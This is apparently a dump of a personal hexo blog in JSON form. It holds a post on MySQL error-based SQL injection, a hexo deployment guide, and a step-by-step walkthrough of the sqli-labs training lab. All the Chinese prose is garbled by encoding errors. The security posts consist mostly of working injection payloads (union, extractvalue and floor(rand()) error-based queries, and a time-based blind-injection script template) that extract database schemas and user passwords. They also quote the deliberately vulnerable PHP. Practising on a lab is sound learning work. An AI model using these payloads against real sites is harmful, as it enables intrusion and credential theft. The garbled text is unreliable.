extractvalueè´Ÿè´£åœ¨xmlæ–‡æ¡£ä¸­æŒ‰ç…§xpathè¯­æ³•æŸ¥è¯¢èŠ‚ç‚¹å†…å®¹ï¼Œupdatexmlåˆ™è´Ÿè´£ä¿®æ”¹æŸ¥è¯¢åˆ°çš„å†…å®¹: å®ƒä»¬çš„ç¬¬äºŒä¸ªå‚æ•°éƒ½è¦æ±‚æ˜¯ç¬¦åˆxpathè¯­æ³•çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”å°†æŸ¥è¯¢ç»“æœæ”¾åœ¨æŠ¥é”™ä¿¡æ¯é‡Œï¼š ä¸»é”®é‡å¤è¿™é‡Œåˆ©ç”¨åˆ°äº†count()å’Œgroup byåœ¨é‡åˆ°rand()äº§ç”Ÿçš„é‡å¤å€¼æ—¶æŠ¥é”™çš„æ€è·¯ã€‚ç½‘ä¸Šæ¯”è¾ƒå¸¸è§çš„payloadæ˜¯è¿™æ ·çš„ï¼š select count(*) from test group by concat(version(),floor(rand(0)*2)); rand()å‡½æ•°ï¼šè¿”å›ä¸€ä¸ª 0 åˆ° 1 ä¹‹é—´çš„æµ®ç‚¹æ•°ï¼Œå¦‚æœç»™å®šäº†æ•´æ•°å¸¸é‡ Nï¼Œå³ rand(N)ï¼ŒN å°†ä¼šè¢«ç”¨ä½œç§å­å€¼ï¼Œå¹¶äº§ç”Ÿå¯é‡å¤çš„å€¼çš„åºåˆ— **floorå‡½æ•°:**è¿”å›å°äºç­‰äºè¯¥å€¼çš„æœ€å¤§æ•´æ•° *COUNT()å‡½æ•°:**è¿”å›åŒ¹é…æŒ‡å®šæ¡ä»¶çš„è¡Œæ•°,COUNT() å‡½æ•°è¿”å›è¡¨ä¸­çš„è®°å½•æ•° æŠ¥é”™éœ€è¦count(*)ï¼Œrand()ã€group byï¼Œä¸‰è€…ç¼ºä¸€ä¸å¯ mysqlçš„å®˜æ–¹æ–‡æ¡£ä¸­å¯¹ rand() å‡½æ•°æœ‰ç‰¹æ®Šçš„è¯´æ˜ï¼š å®˜æ–¹æ–‡æ¡£ä¸­çš„æ„æ€æ˜¯ï¼šåœ¨whereè¯­å¥ä¸­ï¼Œwhereæ¯æ‰§è¡Œä¸€æ¬¡ï¼Œrand()å‡½æ•°å°±ä¼šè¢«è®¡ç®—ä¸€æ¬¡ã€‚rand()ä¸èƒ½ä½œä¸ºorder byçš„æ¡ä»¶å­—æ®µï¼ŒåŒç†ä¹Ÿä¸èƒ½ä½œä¸ºgroup byçš„æ¡ä»¶å­—æ®µã€‚ å› æ­¤åœ¨mysqlä¸­ï¼Œå¯ä»¥æ„é€ ä¸€ä¸ªå€¼ä¸ç¡®å®šè€Œæœ‰å¯é‡å¤çš„å­—æ®µä½œä¸ºgroup byçš„æ¡ä»¶å­—æ®µï¼Œè¿™æ˜¯å°±å¯ä»¥æŠ¥å‡ºç±»ä¼¼äºDuplicate entry &#39;â€¦&#39; for key &#39;group_key&#39;çš„é”™è¯¯ã€‚ å¦å¤–ï¼Œç»è¿‡æµ‹è¯• rand()ä¼šéšæœºæŠ¥é”™ï¼Œå°±æ˜¯æœ‰å¯èƒ½æŠ¥é”™ï¼Œæœ‰çš„æ—¶å€™ä¸ä¼šï¼Œ rand(0)è‚¯å®šä¼šæŠ¥é”™ï¼Œrand(1)åˆ™ä¸€å®šä¸ä¼šæŠ¥é”™ã€‚ æ‰€ä»¥è¦è®©ä»–æŠ¥é”™çš„è¯ç›´æ¥ç”¨rand(0) åŸç†è¯·å‚è§ï¼šhttp://heartsky.info/2016/12/04/å‡ ç§å¸¸è§çš„%20MySQL%20æŠ¥é”™æ³¨å…¥/ ä»¥sqli-labsä¸­çš„Less-5ä¸ºä¾‹ çˆ†æ•°æ®åº“ ?id=1&#39; union select count(*),2,3 from users group by concat(database(),floor(rand(0)*2))%23 çˆ†è¡¨å’Œå­—æ®µ ?id=1&#39; union select count(*),2,3 from information_schema.tables group by concat((select concat(table_schema,&#39;:&#39;,table_name) from information_schema.tables limit 1,1),floor(rand(0)*2))%23 ä¸€äº›ç‰¹æ€§åˆ—åé‡å¤mysqlåˆ—åé‡å¤ä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬åˆ©ç”¨name_constæ¥åˆ¶é€ ä¸€ä¸ªåˆ—ï¼š æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œname_constå‡½æ•°è¦æ±‚å‚æ•°å¿…é¡»æ˜¯å¸¸é‡ï¼Œæ‰€ä»¥å®é™…ä½¿ç”¨ä¸Šè¿˜æ²¡æ‰¾åˆ°ä»€ä¹ˆæ¯”è¾ƒå¥½çš„åˆ©ç”¨æ–¹å¼ã€‚ åˆ©ç”¨è¿™ä¸ªç‰¹æ€§åŠ ä¸Šjoinå‡½æ•°(çŸ¥é“è¡¨å)å¯ä»¥çˆ†åˆ—åï¼š è¿™æ ·ç´¯åŠ çš„æ–¹å¼å°±å¯ä»¥çˆ†å‡ºæ‰€æœ‰çš„å­—æ®µ å‡ ä½•å‡½æ•°mysqlæœ‰äº›å‡ ä½•å‡½æ•°ï¼Œä¾‹å¦‚geometrycollection()ï¼Œmultipoint()ï¼Œpolygon()ï¼Œmultipolygon()ï¼Œlinestring()ï¼Œmultilinestring()ï¼Œè¿™äº›å‡½æ•°å¯¹å‚æ•°è¦æ±‚æ˜¯å½¢å¦‚(1 2,3 3,2 2 1)è¿™æ ·å‡ ä½•æ•°æ®ï¼Œå¦‚æœä¸æ»¡è¶³è¦æ±‚ï¼Œåˆ™ä¼šæŠ¥é”™ã€‚ç»æµ‹è¯•ï¼Œåœ¨ç‰ˆæœ¬å·ä¸º5.5.47ä¸Šå¯ä»¥ç”¨æ¥æ³¨å…¥ï¼Œè€Œåœ¨5.7.17ä¸Šåˆ™ä¸è¡Œï¼š 1234565.5.47mysql&gt; select multipoint((select * from (select * from (select version())a)b));ERROR 1367 (22007): Illegal non geometric &#39;(select &#96;b&#96;.&#96;version()&#96; from ((select &#39;5.5.47&#39; AS &#96;version()&#96; from dual) &#96;b&#96;))&#39; value found during parsing5.7.17mysql&gt; select multipoint((select * from (select * from (select version())a)b));ERROR 1367 (22007): Illegal non geometric &#39;(select &#96;a&#96;.&#96;version()&#96; from ((select version() AS &#96;version()&#96;) &#96;a&#96;))&#39; value found during parsing å‚è€ƒï¼šhttps://xz.aliyun.com/t/253https://hatboy.github.io/2018/08/28/MySQLæŠ¥é”™æ³¨å…¥/","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://www.m00nback.xyz/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://www.m00nback.xyz/tags/ctf/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://www.m00nback.xyz/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"hexoåšå®¢éƒ¨ç½²åˆ°é˜¿é‡Œäº‘","slug":"hexo-deploy-aliyun","date":"2019-10-19T08:37:52.000Z","updated":"2020-01-20T13:56:48.811Z","comments":true,"path":"2019/10/19/hexo-deploy-aliyun/","link":"","permalink":"http://www.m00nback.xyz/2019/10/19/hexo-deploy-aliyun/","excerpt":"","text":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†å¦‚ä½•å°†hexoåšå®¢éƒ¨ç½²åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œgithubå®åœ¨æ˜¯å¤ªæ…¢äº†2333333â€¦â€¦ æœåŠ¡å™¨å®‰è£…å¿…è¦ç¯å¢ƒå®‰è£…git apt-get install git å®‰è£…nginx(å®å¡”ä¸€é”®å®‰è£…) apt-get install nginx æœ¬åœ°ç¯å¢ƒé…ç½®å°±ä¸ä»‹ç»äº† é…ç½®ssh,ä»“åº“,ç½‘ç«™æ ¹ç›®å½•æ·»åŠ ç”¨æˆ· useradd git //æ·»åŠ gitç”¨æˆ· passwd git //ä¸ºgitç”¨æˆ·è®¾ä¸ªå¯†ç  é…ç½®ssh cd /home å¦‚æœæ²¡æœ‰gitæ–‡ä»¶å¤¹åˆ›å»ºä¸€ä¸ª mkdir /home/git æœ‰çš„è¯è·³è¿‡ su git //åˆ‡æ¢gitç”¨æˆ· mkdir /home/git/.ssh touch /home/git/.ssh/authorized_keys vi /home/git/.ssh/authorized_keys é‡Œé¢å†…å®¹å¡«æœ¬æœºé‡Œå¾—å¯¹åº”ç”¨æˆ·ç›®å½•ä¸‹çš„.ssh/id_rsa.pubçš„å†…å®¹ é…ç½®å®Œå¯ä»¥sshç™»é™†ä¸€ä¸‹ é…ç½®ä»“åº“ å¯ä»¥åœ¨/home/git/ä¸‹æ–°å»ºä¸€ä¸ªblog.gitæ–‡ä»¶å¤¹ï¼Œç”¨äºå»ºç«‹gitä»“åº“ git init --bare blog.git å»ºç«‹é’©å­(æœ¬åœ°éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¼šæ‰§è¡Œ) vi ~/blog.git/hooks/post-receive å¡«å…¥ä»¥ä¸‹å†…å®¹ï¼Œwork-treeæ˜¯ç½‘ç«™ç›®å½•ï¼Œgit-diræ˜¯gitä»“åº“ç›®å½• git --work-tree=/home/git/hexo --git-dir=/home/git/blog.git checkout -f å»ºç«‹hexoæ–‡ä»¶å¤¹ mkdir /home/git/hexo å°†gitæ–‡ä»¶å¤¹æ‰€æœ‰è€…æ›´æ”¹ä¸ºgitç”¨æˆ·ï¼Œå¹¶å°†ç”¨æˆ·ç›®å½•æƒé™æ”¹ä¸º775ï¼Œå³å…è®¸gitç”¨æˆ·å†™å…¥ 12chown -R git:git git &#x2F;&#x2F;æƒé™é—®é¢˜å¯èƒ½ä¼šæ˜¯æŠ¥é”™çš„ä¸»è¦åŸå› chmod -R git 775 é…ç½®ç½‘ç«™æ ¹ç›®å½• nginx -t //æŸ¥çœ‹nginxé…ç½®æ–‡ä»¶ä½ç½® cat /www/server/nginx/conf/nginx.conf æ²¡æœ‰å‘ç°æœ‰å’Œç½‘ç«™ç›¸å…³çš„ï¼Œä½†æ˜¯å‘ç°äº†åŒ…å«äº†æ–‡ä»¶ cd /www/server/panel/vhost/nginx/ ls å‘ç°éƒ½æ˜¯ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼Œæˆ‘ç”¨å®å¡”ä¸€é”®åˆ›å»ºçš„ç½‘ç«™(ä¸çŸ¥é“ä¸ºå•¥æºç ä¸èƒ½æ”¾åœ¨/www/wwwrootä¸‹)ï¼Œæ‰€ä»¥é‡Œé¢æœ‰ç½‘ç«™.conf 12345678server&#123; listen 80; listen [::]:80; server_name ä½ çš„æœåŠ¡å™¨åœ°å€; index index.php index.html index.htm default.php default.htm default.html; root &#x2F;home&#x2F;git&#x2F;hexo; .... å®å¡”å¯ä»¥ä¸€é”®ä¿®æ”¹ç›®å½• éƒ¨ç½²æ›´æ”¹æœ¬åœ°_config.ymlæ–‡ä»¶ 1234deploy: type: git repo: aliyun: git@ä½ çš„æœåŠ¡å™¨åœ°å€:&#x2F;home&#x2F;git&#x2F;blog.git,master ç„¶å hexo g hexo d è¿˜è¦æ‰‹åŠ¨è¿è¡Œä¸€ä¸‹ä¹‹å‰è®¾ç½®é‚£ä¸ªé’©å­ï¼Œç”¨å®å¡”åˆ›å»ºå¯èƒ½ä¼šç”Ÿæˆ.user.iniæ–‡ä»¶ï¼Œå¯èƒ½ä¼šå¹²æ‰°ï¼Œå»ºè®®åˆ é™¤ å°±å¯ä»¥éƒ¨ç½²åˆ°/home/git/hexoæ–‡ä»¶å¤¹é‡Œäº† â€‹","categories":[],"tags":[{"name":"åšå®¢","slug":"åšå®¢","permalink":"http://www.m00nback.xyz/tags/%E5%8D%9A%E5%AE%A2/"},{"name":"æŠ˜è…¾","slug":"æŠ˜è…¾","permalink":"http://www.m00nback.xyz/tags/%E6%8A%98%E8%85%BE/"},{"name":"hexo","slug":"hexo","permalink":"http://www.m00nback.xyz/tags/hexo/"}]},{"title":"sqli-labsé€šå…³æ‰‹å†Œ","slug":"sqli-labs-wp","date":"2019-10-17T05:46:42.000Z","updated":"2020-05-13T16:16:20.894Z","comments":true,"path":"2019/10/17/sqli-labs-wp/","link":"","permalink":"http://www.m00nback.xyz/2019/10/17/sqli-labs-wp/","excerpt":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†sqli-labsé€šå…³æ•™ç¨‹ï¼æŒç»­æ›´æ–°ä¸­ï¼","text":"æœ¬ç¯‡åšå®¢ä»‹ç»äº†sqli-labsé€šå…³æ•™ç¨‹ï¼æŒç»­æ›´æ–°ä¸­ï¼ Less-1å¯¹äºsqlæ˜¾é”™æ³¨å…¥é¦–å…ˆåº”è¯¥æƒ³åˆ°çš„æ—¶åç«¯sqlè¯­å¥çš„æ ¼å¼ æ¥ä¸‹æ¥çš„Less-1~Less-4éƒ½æ˜¯ç”¨è”åˆæŸ¥è¯¢çš„æ–¹å¼ å…ˆæµ‹è¯•ä¸‹æ­£å¸¸å›æ˜¾çš„æƒ…å†µå§ ?id=1 å‘ç°æ­£å¸¸å›æ˜¾ æƒ³åŠæ³•æŠ¥é”™ ?id=1%27 å‘ç°å›æ˜¾è¿™ åˆ†æä¸€ä¸‹ &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; å·¦å³ä¸¤ç«¯çš„&#39;&#39;ä»£è¡¨é‡Œé¢çš„å†…å®¹ä¸ºå­—ç¬¦ä¸²ï¼Œ&#39;1&#39;&#39;ç›¸å½“äº&#39;$id&#39; è€Œåå°çš„sqlè¯­å¥ä¸º 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;; æ­£å¦‚å›æ˜¾çš„é”™è¯¯ä¸€è‡´ order byåˆ¤æ–­åˆ—æ•° ?id=1%27%20order%20by%204%23 //å›æ˜¾é”™è¯¯ ?id=1%27%20order%20by%203%23 //å›æ˜¾æ­£å¸¸ è¯æ˜ä»£å…¥æŸ¥è¯¢çš„å­—æ®µå…±3åˆ— åˆ¤æ–­å›æ˜¾ä½ï¼š ?id=-1%27%20union%20select%201,2,3%23 //å›æ˜¾ä½ä¸º2ï¼Œ3 çˆ†æ•°æ®åº“ï¼š ?id=-1%27%20union%20select%201,group_concat(schema_name),3%20from%20information_schema.schemata%23 çˆ†è¡¨ï¼š ?id=-1%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=%27security%27%23 æˆ– ?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 çˆ†å­—æ®µï¼š ?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23 çˆ†å†…å®¹ï¼š ?id=-1&#39; union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23 çˆ†æ•°æ®åº“ï¼š 1?id=1&#x27; and extractvalue(1,concat(0x7e,(database())))%23 çˆ†è¡¨ï¼š 1?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))%23 çˆ†å­—æ®µï¼š 1?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))%23 çˆ†å†…å®¹ï¼š 1?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(id,0x23,username,0x23,password) from security.users)))%23 å…³é”®ä»£ç 1234567891011121314151617$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123; echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&quot;;&#125;else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; &#125; Less-2é¢˜ç›®åŒæ ·å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼ å»¶ç»­ç¬¬ä¸€é¢˜çš„æ€è·¯ï¼Œæƒ³è®©æŠ¥é”™ ?id=1&#39; åˆ†æä¸€ä¸‹ &#39;&#39; LIMIT 0,1&#39; å¥½åƒ$idæ²¡æœ‰&#39;ä¹‹ç±»çš„ åå°sqlè¯­å¥ 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;; æœç„¶æ²¡æœ‰ order byåˆ¤æ–­åˆ—æ•° ?id=1 order by 3%23 å‘ç°è¿˜æ˜¯3åˆ— çˆ†æ•°æ®åº“ ?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata%23 çˆ†è¡¨ ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 çˆ†å­—æ®µ ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23 çˆ†å†…å®¹ ?id=-1 union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23 å…³é”®ä»£ç 1234567891011121314151617$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];echo &quot;&lt;br&gt;&quot;;echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/font&gt;&quot;; &#125; Less-3é¢˜ç›®åŒæ ·å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼ ç»§ç»­è®©å…¶æŠ¥é”™ ?id=1â€™ åˆ†æä»¥ä¸‹ &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; ç”±æŠ¥é”™ä¿¡æ¯å¯çŸ¥ï¼Œåå°çš„sqlè¯­å¥åº”è¯¥å¸¦æœ‰æ‹¬å·ï¼Œå¹¶ä¸”æœ‰&#39;,å³(&#39;$id&#39;) çœ‹ä¸‹åå°è¯­å¥ 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;; æœç„¶å¦‚æ­¤ é‚£ä¹ˆæ¥ä¸‹æ¥è¿˜æ˜¯è€è§„çŸ©äº† order byåˆ¤æ–­åˆ—æ•° ?id=1&#39;) order by 3%23 çˆ†æ•°æ®åº“ ?id=-1&#39;) union select 1,group_concat(schema_name),3 from information_schema.schemata%23 çˆ†è¡¨ ?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 çˆ†å­—æ®µ ?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23 çˆ†å†…å®¹ ?id=-1&#39;) union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23 å…³é”®ä»£ç 12345678910111213141516171819$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;;echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];echo &quot;&lt;br&gt;&quot;;echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/font&gt;&quot;; &#125; Less-4åŒæ ·ï¼Œç»§ç»­è¿™ç§æ€è·¯ å‘ç°å½“åŠ ä¸Š&quot;æŠ¥é”™ ?id=1â€ åˆ†æä¸€ä¸‹æŠ¥é”™ &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; åå°çš„sqlè¯­å¥åº”è¯¥ä¸º(&quot;$id&quot;) 12$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;; å’Œæˆ‘ä»¬çŒœçš„ä¸€æ · order byåˆ¤æ–­åˆ—æ•° ?id=1&quot;) order by 3%23 åŒæ ·æ˜¯ä¸‰åˆ— çˆ†æ•°æ®åº“ ?id=-1&quot;) union select 1,2,group_concat(schema_name) from information_schema.schemata%23 çˆ†è¡¨ ?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23 çˆ†å­—æ®µ ?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23 çˆ†å†…å®¹ ?id=-1&quot;) union select 1,2,group_concat(id,0x23,username,0x23,password) from security.users%23 å…³é”®ä»£ç 12345678910111213141516171819$id = &#x27;&quot;&#x27; . $id . &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; &#125; Less-5æŠ¥é”™æ³¨å…¥ é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œç¬¬ä¸€æ¬¡æˆ‘ç”¨äº†ç›²æ³¨ğŸ˜‚ æ€è·¯å’ŒLess-1ä¸€æ · ç›²æ³¨ è™½ç„¶ä¸æ˜¯ï¼Œä½†æ˜¯è¿˜æ˜¯è¦æ ¹æ®æŠ¥é”™ä¿¡æ¯æ¥æ„é€ è¯­å¥ ?id=1&#39; åˆ†æä¸€ä¸‹æŠ¥é”™ä¿¡æ¯ &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; å¥½åƒå’ŒLess-1ä¸€æ ·ï¼Œä½†æ˜¯ç°åœ¨ä¸å›æ˜¾æŸ¥è¯¢çš„ç»“æœäº† è¿™å°±æ˜¯ç›²æ³¨ï¼Œéœ€è¦å†™è„šæœ¬æ¥çˆ†ç ´å†…å®¹ï¼Œåœ¨è¿™ä¹‹å‰å…ˆä»‹ç»å‡ ä¸ªå‡½æ•° ifå‡½æ•° æ ¼å¼ï¼šIF(Condition,A,B) å«ä¹‰ï¼šå¦‚æœConditionæˆç«‹ï¼Œåˆ™Aï¼Œå¦åˆ™B substrå‡½æ•° æ ¼å¼ï¼šSUBSTR(string,start,len) å«ä¹‰ï¼šä»stringçš„startä½å¼€å§‹æˆªå–lenä¸ªå­—ç¬¦ midå‡½æ•° æ ¼å¼ï¼šMID(column_name,start[,length]) å«ä¹‰ï¼šä»column_nameä¸­startä½å¼€å§‹æˆªå–length(å¯é€‰å‚æ•°)é•¿åº¦ asciiå‡½æ•° æ ¼å¼ï¼šASCII(char) å«ä¹‰ï¼šå°†charè½¬åŒ–æˆasciiç  leftå‡½æ•° æ ¼å¼ï¼šLEFT ( string, n ) å«ä¹‰ï¼šå‡½æ•°å¾—åˆ°å­—ç¬¦ä¸²å·¦éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ï¼Œstringä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œnä¸ºé•¿åº¦ã€‚ rightå‡½æ•° æ ¼å¼ï¼šRIGHT( string, n ) å«ä¹‰ï¼šå‡½æ•°å¾—åˆ°å­—ç¬¦ä¸²å³éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ï¼Œstringä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œnä¸ºé•¿åº¦ã€‚ lengthå‡½æ•° æ ¼å¼ï¼šLENGTH(string) å«ä¹‰ï¼šå¾—åˆ°stringçš„é•¿åº¦ æ¨¡æ¿ 12345try: r&#x3D;requests.get(url+payload,timeout&#x3D;3) &#x2F;&#x2F;æ³¨æ„è¦è®¾ç½®è®¾ç½®timeoutexcept requests.exceptions.ReadTimeout as e: &#x2F;&#x2F;è¶…æ—¶å¼‚å¸¸ data+&#x3D;chr(j) break å¤–é¢åµŒå¥—å¾ªç¯å°±è¡Œ çˆ†æ•°æ®åº“ 1payload &#x3D; &quot;?id&#x3D;1&#39; and if(ascii(substr(database(),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(j, k) çˆ†è¡¨ 1payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(k , i, j) çˆ†å­—æ®µ 1payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;&#123;&#125;&quot; limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(te,k,i,j) çˆ†å†…å®¹ 1payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substring((select &#123;&#125; from &#123;&#125;.&#123;&#125; limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(co,db,ta,k,i,j) æŒ‰ç…§è¿™ä¸ªpayloadå°±å¯ä»¥è·‘å‡ºæ¥ï¼Œä½†é€Ÿåº¦æ˜¯æ˜¯çœŸçš„æ…¢ å…³é”®ä»£ç 1234567891011121314151617181920$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in...........&#x27;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; &#125; Less-6é¢˜ç›®åŒæ ·å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼ åŒæ ·å¯ä»¥å…ˆè®©å…¶æŠ¥é”™ï¼ŒæŸ¥çœ‹åå°sqlè¯­æ³• å‘ç°å½“ ?id=6&quot; æ—¶ï¼Œä¼šæŠ¥é”™å‡ºè¯­å¥ å¯ä»¥çœ‹åˆ°åå°çš„sqlè¯­å¥ä¸º 12$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;; åé¢çš„æ“ä½œå’Œä¹‹å‰å°±æ²¡ä»€ä¹ˆåŒºåˆ«äº†ï¼Œåˆ©ç”¨ ?id=1&quot;+æ³¨å…¥è¯­å¥+%23 å°±å¯ä»¥æ³¨å…¥å¾—åˆ°ç»“æœäº† å…³é”®ä»£ç 123456789101112131415161718192021$id = &#x27;&quot;&#x27;.$id.&#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row)&#123;echo &#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;; echo &#x27;You are in...........&#x27;;echo &quot;&lt;br&gt;&quot;;echo &quot;&lt;/font&gt;&quot;;&#125;else &#123;echo &#x27;&lt;font size=&quot;3&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;print_r(mysql_error());echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;; &#125; Less-7ç›²æ³¨è¿™é¢˜å¥½åƒçˆ†ä¸å‡ºåå°sqlè¯­å¥ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¤šè¯•è¯•å¸¸ç”¨çš„æµ‹è¯•æ³¨å…¥çš„è¯­å¥ ç›´æ¥çœ‹ä¸‹å‘ç°æºç å§ï¼Œå‘ç° 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;; åŒæ ·ï¼Œåˆ©ç”¨ ?id=1&#39;))+æ³¨å…¥è¯­å¥+%23 ä¹Ÿå¯ä»¥ç›²æ³¨æ³¨å…¥äº† å†™æ–‡ä»¶å…ˆçœ‹ä¸‹è·¯å¾„ï¼Œè¿™ä¸ªå¥½åƒæŠ¥ä¸å‡ºæ¥ï¼Œåªèƒ½ç”¨å…¶ä»–çš„é¢˜ç›®ï¼Œä»¥Less-1ä¸ºä¾‹ 1/Less-1/?id=-1&#x27; union select 1,@@basedir,@@datadir%23 